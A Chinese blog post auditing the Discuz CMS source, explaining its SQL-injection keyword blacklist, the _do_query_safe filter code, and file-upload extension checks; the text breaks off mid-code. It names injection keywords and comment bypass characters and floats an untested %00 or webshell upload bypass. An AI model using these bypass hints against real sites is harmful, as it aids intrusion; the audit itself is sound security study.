<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Klaus&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Klaus&#39;s Blog">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Klaus&#39;s Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Klaus&#39;s Blog">
  
    <link rel="alternate" href="/atom.xml" title="Klaus&#39;s Blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Klaus&#39;s Blog</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">我永远喜欢德国队！</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-DiscuzCMS-代码审计-更新ing" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/03/09/DiscuzCMS-代码审计-更新ing/" class="article-date">
  <time datetime="2018-03-09T14:53:04.000Z" itemprop="datePublished">2018-03-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/代码审计/">代码审计</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/03/09/DiscuzCMS-代码审计-更新ing/">DiscuzCMS 代码审计(3.17更新ing)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>选择Discuz作为第一个审计的CMS大概是因为某天（具体日期我忘了）我下了个源码放在根目录下，that’s it。<br>Here we go~<br>审计环境：本地搭建的Discuz源码+phpStudy+MySQL+Windows</p>
<h2 id="Discuz中的sql防御机制"><a href="#Discuz中的sql防御机制" class="headerlink" title="Discuz中的sql防御机制"></a>Discuz中的sql防御机制</h2><p>DiscuzCMS配置文件/config/config_global.php文件下有一行代码是sql注入的过滤机制。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'status'</span>] = 1;</span><br></pre></td></tr></table></figure></p>
<p>往下看的参数都是过滤机制，直接过滤了sql注入需要用到很多关键字以及绕过字符。<br>关键字过滤<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'0'</span>] = '@';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'1'</span>] = 'intooutfile';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'2'</span>] = 'intodumpfile';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'3'</span>] = 'unionselect';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'4'</span>] = '(select';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'5'</span>] = 'unionall';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'daction'</span>][<span class="symbol">'6'</span>] = 'uniondistinct';</span><br></pre></td></tr></table></figure></p>
<p>绕过字符过滤<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'dnote'</span>][<span class="symbol">'0'</span>] = '/*';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'dnote'</span>][<span class="symbol">'1'</span>] = '*/';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'dnote'</span>][<span class="symbol">'2'</span>] = '#';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'dnote'</span>][<span class="symbol">'3'</span>] = '--';</span><br><span class="line">$_config[<span class="string">'security'</span>][<span class="symbol">'querysafe'</span>][<span class="string">'dnote'</span>][<span class="symbol">'4'</span>] = '"';</span><br></pre></td></tr></table></figure></p>
<p>Discuz执行SQL语句之前会调用\source\class\discuz_database.php文件下的discuz_database_safecheck类下面的checkquery($sql)函数进行过滤，跟踪该函数。<br><img src="https://i.loli.net/2018/03/13/5aa7f3c2e7204.png" alt=""><br>函数首先加载了config/security/querysafe这个文件，$config[‘status’]为真后$cmd的值由经过trim(),substr(),strtoupper()过滤后的$sql赋予。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">相关php函数科普：</span><br><span class="line"><span class="function"><span class="title">trim</span><span class="params">()</span></span>：取出php首尾的空格；</span><br><span class="line"><span class="function"><span class="title">substr</span><span class="params">()</span></span>：substr(<span class="variable">$str1</span>,num1,num2)，从限定字符串中取出从num1到num2长度的内容；</span><br><span class="line"><span class="function"><span class="title">strtoupper</span><span class="params">()</span></span>：将字符串转换为大写。</span><br></pre></td></tr></table></figure></p>
<p>继续跟踪代码，检查到$cmd被被作为$checkcmd的一个键值被带入查询，接着调用了_do_query_safe($sql)这个函数，切换到这个函数定义。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_do_query_safe</span><span class="params">($sql)</span> </span>&#123;</span><br><span class="line">		$sql = str_replace(<span class="keyword">array</span>(<span class="string">'\\\\'</span>, <span class="string">'\\\''</span>, <span class="string">'\\"'</span>, <span class="string">'\'\''</span>), <span class="string">''</span>, $sql);</span><br><span class="line">		$mark = $clean = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span> (strpos($sql, <span class="string">'/'</span>) === <span class="keyword">false</span> &amp;&amp; strpos($sql, <span class="string">'#'</span>) === <span class="keyword">false</span> &amp;&amp; strpos($sql, <span class="string">'-- '</span>) === <span class="keyword">false</span> &amp;&amp; strpos($sql, <span class="string">'@'</span>) === <span class="keyword">false</span> &amp;&amp; strpos($sql, <span class="string">'`'</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">			$clean = preg_replace(<span class="string">"/'(.+?)'/s"</span>, <span class="string">''</span>, $sql);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$len = strlen($sql);</span><br><span class="line">			$mark = $clean = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">				$str = $sql[$i];</span><br><span class="line">				<span class="keyword">switch</span> ($str) &#123;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'`'</span>:</span><br><span class="line">						<span class="keyword">if</span>(!$mark) &#123;</span><br><span class="line">							$mark = <span class="string">'`'</span>;</span><br><span class="line">							$clean .= $str;</span><br><span class="line">						&#125; <span class="keyword">elseif</span> ($mark == <span class="string">'`'</span>) &#123;</span><br><span class="line">							$mark = <span class="string">''</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'\''</span>:</span><br><span class="line">						<span class="keyword">if</span> (!$mark) &#123;</span><br><span class="line">							$mark = <span class="string">'\''</span>;</span><br><span class="line">							$clean .= $str;</span><br><span class="line">						&#125; <span class="keyword">elseif</span> ($mark == <span class="string">'\''</span>) &#123;</span><br><span class="line">							$mark = <span class="string">''</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">empty</span>($mark) &amp;&amp; $sql[$i + <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">							$mark = <span class="string">'/*'</span>;</span><br><span class="line">							$clean .= $mark;</span><br><span class="line">							$i++;</span><br><span class="line">						&#125; <span class="keyword">elseif</span> ($mark == <span class="string">'/*'</span> &amp;&amp; $sql[$i - <span class="number">1</span>] == <span class="string">'*'</span>) &#123;</span><br><span class="line">							$mark = <span class="string">''</span>;</span><br><span class="line">							$clean .= <span class="string">'*'</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'#'</span>:</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">empty</span>($mark)) &#123;</span><br><span class="line">							$mark = $str;</span><br><span class="line">							$clean .= $str;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">"\n"</span>:</span><br><span class="line">						<span class="keyword">if</span> ($mark == <span class="string">'#'</span> || $mark == <span class="string">'--'</span>) &#123;</span><br><span class="line">							$mark = <span class="string">''</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">						<span class="keyword">if</span> (<span class="keyword">empty</span>($mark) &amp;&amp; substr($sql, $i, <span class="number">3</span>) == <span class="string">'-- '</span>) &#123;</span><br><span class="line">							$mark = <span class="string">'-- '</span>;</span><br><span class="line">							$clean .= $mark;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				$clean .= $mark ? <span class="string">''</span> : $str;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($clean, <span class="string">'@'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'-3'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$clean = preg_replace(<span class="string">"/[^a-z0-9_\-\(\)#\*\/\"]+/is"</span>, <span class="string">""</span>, strtolower($clean));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">self</span>::$config[<span class="string">'afullnote'</span>]) &#123;</span><br><span class="line">			$clean = str_replace(<span class="string">'/**/'</span>, <span class="string">''</span>, $clean);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (is_array(<span class="keyword">self</span>::$config[<span class="string">'dfunction'</span>])) &#123;</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="keyword">self</span>::$config[<span class="string">'dfunction'</span>] <span class="keyword">as</span> $fun) &#123;</span><br><span class="line">				<span class="keyword">if</span> (strpos($clean, $fun . <span class="string">'('</span>) !== <span class="keyword">false</span>)</span><br><span class="line">					<span class="keyword">return</span> <span class="string">'-1'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (is_array(<span class="keyword">self</span>::$config[<span class="string">'daction'</span>])) &#123;</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="keyword">self</span>::$config[<span class="string">'daction'</span>] <span class="keyword">as</span> $action) &#123;</span><br><span class="line">				<span class="keyword">if</span> (strpos($clean, $action) !== <span class="keyword">false</span>)</span><br><span class="line">					<span class="keyword">return</span> <span class="string">'-3'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">self</span>::$config[<span class="string">'dlikehex'</span>] &amp;&amp; strpos($clean, <span class="string">'like0x'</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">'-2'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (is_array(<span class="keyword">self</span>::$config[<span class="string">'dnote'</span>])) &#123;</span><br><span class="line">			<span class="keyword">foreach</span> (<span class="keyword">self</span>::$config[<span class="string">'dnote'</span>] <span class="keyword">as</span> $note) &#123;</span><br><span class="line">				<span class="keyword">if</span> (strpos($clean, $note) !== <span class="keyword">false</span>)</span><br><span class="line">					<span class="keyword">return</span> <span class="string">'-4'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>if语句里面首先限定了不能存在的字符(/，#，–，@，’`’)，满足条件后再次进行正则匹配来过滤，被preg_match()过滤后的字符被保存在$clean字符串里。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php函数科普</span><br><span class="line"><span class="function"><span class="title">preg_match</span><span class="params">(<span class="variable">$pattern</span>,<span class="variable">$replacement</span>,<span class="variable">$str</span>)</span></span>:依次是，正则表达式，符合正则表达式后需要被替换的词，需要进行正则替换的字符串。</span><br></pre></td></tr></table></figure>
<p>代码继续向后看，使用了switch()语句对相关字符进行字符串添加，将字符添加到$clean里面再进行下面的操作。<br>首先检查’@’，后面加上一个可怕的正则表达式。<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$clean = preg_replace</span>("/[^a-z0-9_<span class="symbol">\-</span><span class="symbol">\(</span><span class="symbol">\)</span>#<span class="symbol">\*</span><span class="symbol">\/</span><span class="symbol">\"</span>]+/is", "", strtolower(<span class="keyword">$clean));</span></span><br></pre></td></tr></table></figure></p>
<p>直接过滤掉逗号等，往后看有一个细节：<br><img src="https://i.loli.net/2018/03/13/5aa7f3c3189f1.png" alt=""></p>
<p>$config[‘afullnote’]这个参数，回到之前的config_global.php文件：<br><img src="https://i.loli.net/2018/03/13/5aa7f3c322c0b.png" alt=""></p>
<p>查了一下资料发现这里的值是必须设置为0的，如果没有被设置为’0’，那么提交/<em>sql</em>/，中间的sql会被替换为空，后面有一个dnote检测，如果检测到’/<em>‘或’</em>/‘就直接返回‘-4’，说明检测到sql注入攻击，找到一个有趣的东西，通过报错注入来利用这里这个漏洞。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.freebuf.com<span class="regexp">/articles/</span>web<span class="regexp">/8038.html</span></span><br></pre></td></tr></table></figure>
<h2 id="Discuz中的文件上传检测机制"><a href="#Discuz中的文件上传检测机制" class="headerlink" title="Discuz中的文件上传检测机制"></a>Discuz中的文件上传检测机制</h2><p>相关文件目录：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">source<span class="symbol">\c</span>lass<span class="symbol">\d</span>iscuz<span class="symbol">\d</span>iscuz_upload.php</span><br><span class="line">source<span class="symbol">\f</span>unction<span class="symbol">\f</span>unction_core.php</span><br><span class="line">static<span class="symbol">\j</span>s<span class="symbol">\h</span>ome.js</span><br></pre></td></tr></table></figure></p>
<p>Discuz下的文件过滤机制是定义了一个discuz_upload类来进行。<br>首先在初始化函数中对上传文件的参数(大小，名字，扩展名，判断是否是图片，其他拓展，目录)进行初始化。</p>
<h3 id="检测上传文件的目录"><a href="#检测上传文件的目录" class="headerlink" title="检测上传文件的目录"></a>检测上传文件的目录</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_dir_type</span><span class="params">($type)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> !in_array($type, <span class="keyword">array</span>(<span class="string">'forum'</span>, <span class="string">'group'</span>, <span class="string">'album'</span>, <span class="string">'portal'</span>, <span class="string">'common'</span>, <span class="string">'temp'</span>, <span class="string">'category'</span>, <span class="string">'profile'</span>)) ? <span class="string">'temp'</span> : $type;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>查看文件是从哪个目录下上传的。</p>
<h3 id="检测上传文件的大小以及名称"><a href="#检测上传文件的大小以及名称" class="headerlink" title="检测上传文件的大小以及名称"></a>检测上传文件的大小以及名称</h3><p>使用函数intval()来对上传文件的大小进行过滤，使用trim()来删除文件名首尾的空格。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">attach[<span class="string">'size'</span>] = intval(<span class="variable">$attach</span>[<span class="string">'size'</span>]);</span></span><br><span class="line"><span class="meta">$</span><span class="bash">attach[<span class="string">'name'</span>] =  trim(<span class="variable">$attach</span>[<span class="string">'name'</span>]);</span></span><br></pre></td></tr></table></figure></p>
<p>关于文件名那里有一个Discuz自带的一个函数：dhtmlspecialchars()。<br>我查了一下资料，可以参考这个：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//m</span>.blog.sina.com.cn<span class="regexp">/s/</span>blog_8f9418df0100ugx1.html<span class="comment">#page=1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="获取文件的后缀名"><a href="#获取文件的后缀名" class="headerlink" title="获取文件的后缀名"></a>获取文件的后缀名</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$attach</span>[<span class="string">'ext'</span>] = <span class="variable">$this</span>-&gt;fileext(<span class="variable">$attach</span>[<span class="string">'name'</span>]);</span><br></pre></td></tr></table></figure>
<p>直接调用类内函数，跟踪ext判断函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fileext</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> addslashes(strtolower(substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>, <span class="number">10</span>)));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>-w-这个有点点凶残，strrchr()函数找到上传文件名中’.’的最后位置，然后取出1到10位，进行小写转换后直接addslashes()过滤。<br>-tips:PHP相关函数科普<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strrchr</span><span class="params">()</span></span>：两个参数，第一个字符串，第二个是待查找的子串，函数返回的结果是子串在字符串中出现的最后位置(从左往右)。</span><br><span class="line"><span class="function"><span class="title">addslashes</span><span class="params">()</span></span>:对字符(单引号，双引号等)进行转义。</span><br></pre></td></tr></table></figure></p>
<h3 id="判断上传文件是否是图片"><a href="#判断上传文件是否是图片" class="headerlink" title="判断上传文件是否是图片"></a>判断上传文件是否是图片</h3><p>在初始化函数里只有一行代码<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$attach</span>[<span class="string">'isimage'</span>] = <span class="variable">$this</span>-&gt;is_image_ext(<span class="variable">$attach</span>[<span class="string">'ext'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>但是后面调用了一个类里面定义的函数，跟踪这个函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_image_ext</span><span class="params">($ext)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">static</span> $imgext  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'bmp'</span>);</span><br><span class="line">		<span class="keyword">return</span> in_array($ext, $imgext) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>定义一个静态数组后使用in_array()函数来进行判断后缀名是否属于其中的图片后缀，是一种基于白名单的过滤方式。<br>-idea:这里有一个小想法但是还没实践，Discuz是通过判断后缀名来识别图片，是否可以%00绕过或者写入一句话？有待证明。</p>
<h3 id="获取上传文件的扩展名"><a href="#获取上传文件的扩展名" class="headerlink" title="获取上传文件的扩展名"></a>获取上传文件的扩展名</h3><p>well，操作同上，直接跟踪代码。<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$attach</span>[<span class="string">'extension'</span>] = <span class="variable">$this</span>-&gt;get_target_extension(<span class="variable">$attach</span>[<span class="string">'ext'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>同样也是白名单限制，和判断图片那里大同小异<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_target_extension</span><span class="params">($ext)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">static</span> $safeext  = <span class="keyword">array</span>(<span class="string">'attach'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'swf'</span>, <span class="string">'bmp'</span>, <span class="string">'txt'</span>, <span class="string">'zip'</span>, <span class="string">'rar'</span>, <span class="string">'mp3'</span>);</span><br><span class="line">		<span class="keyword">return</span> strtolower(!in_array(strtolower($ext), $safeext) ? <span class="string">'attach'</span> : $ext);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="获取目标文件的存储路径"><a href="#获取目标文件的存储路径" class="headerlink" title="获取目标文件的存储路径"></a>获取目标文件的存储路径</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$attach</span>[<span class="string">'attachdir'</span>] = <span class="variable">$this</span>-&gt;get_target_dir(<span class="variable">$this</span>-&gt;type, <span class="variable">$extid</span>);</span><br></pre></td></tr></table></figure>
<p>直接跟踪函数好了！<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function get_target_dir($type, $extid = <span class="string">''</span>, $check_exists = <span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">		$subdir = $subdir1 = $subdir2 = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span>($type == <span class="string">'album'</span> <span class="params">||</span> $type == <span class="string">'forum'</span> <span class="params">||</span> $type == <span class="string">'portal'</span> <span class="params">||</span> $type == <span class="string">'category'</span> <span class="params">||</span> $type == <span class="string">'profile'</span>) &#123;</span><br><span class="line">			$subdir1 = date(<span class="string">'Ym'</span>);</span><br><span class="line">			$subdir2 = date(<span class="string">'d'</span>);</span><br><span class="line">			$subdir = $subdir1.<span class="string">'/'</span>.$subdir2.<span class="string">'/'</span>;</span><br><span class="line">		&#125; elseif($type == <span class="string">'group'</span> <span class="params">||</span> $type == <span class="string">'common'</span>) &#123;</span><br><span class="line">			$subdir = $subdir1 = substr(md5($extid), <span class="number">0</span>, <span class="number">2</span>).<span class="string">'/'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$check_exists &amp;&amp; discuz_upload::check_dir_exists($type, $subdir1, $subdir2);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $subdir;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果是相册，论坛或者是简介等地方上传上来的，则是通过上传日期来作为目录并存储上传图像。<br>如果是group或者是common下则是通过md5加密后取前3位来命名文件目录。<br>最后检查目录是否存在，存在则返回目录~</p>
<h3 id="完整存储路径"><a href="#完整存储路径" class="headerlink" title="完整存储路径"></a>完整存储路径</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$attach</span>[<span class="string">'attachment'</span>] = <span class="variable">$attach</span>[<span class="string">'attachdir'</span>].<span class="variable">$this</span>-&gt;get_target_filename(<span class="variable">$this</span>-&gt;type, <span class="variable">$this</span>-&gt;extid, <span class="variable">$this</span>-&gt;forcename).<span class="string">'.'</span>.<span class="variable">$attach</span>[<span class="string">'extension'</span>];</span><br></pre></td></tr></table></figure>
<p>还是根据上传图片所在目录位置的不同来进行存储√<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_target_filename</span><span class="params">($type, $extid = <span class="number">0</span>, $forcename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>($type == <span class="string">'group'</span> || ($type == <span class="string">'common'</span> &amp;&amp; $forcename != <span class="string">''</span>)) &#123;</span><br><span class="line">			$filename = $type.<span class="string">'_'</span>.intval($extid).($forcename != <span class="string">''</span> ? <span class="string">"_$forcename"</span> : <span class="string">''</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$filename = date(<span 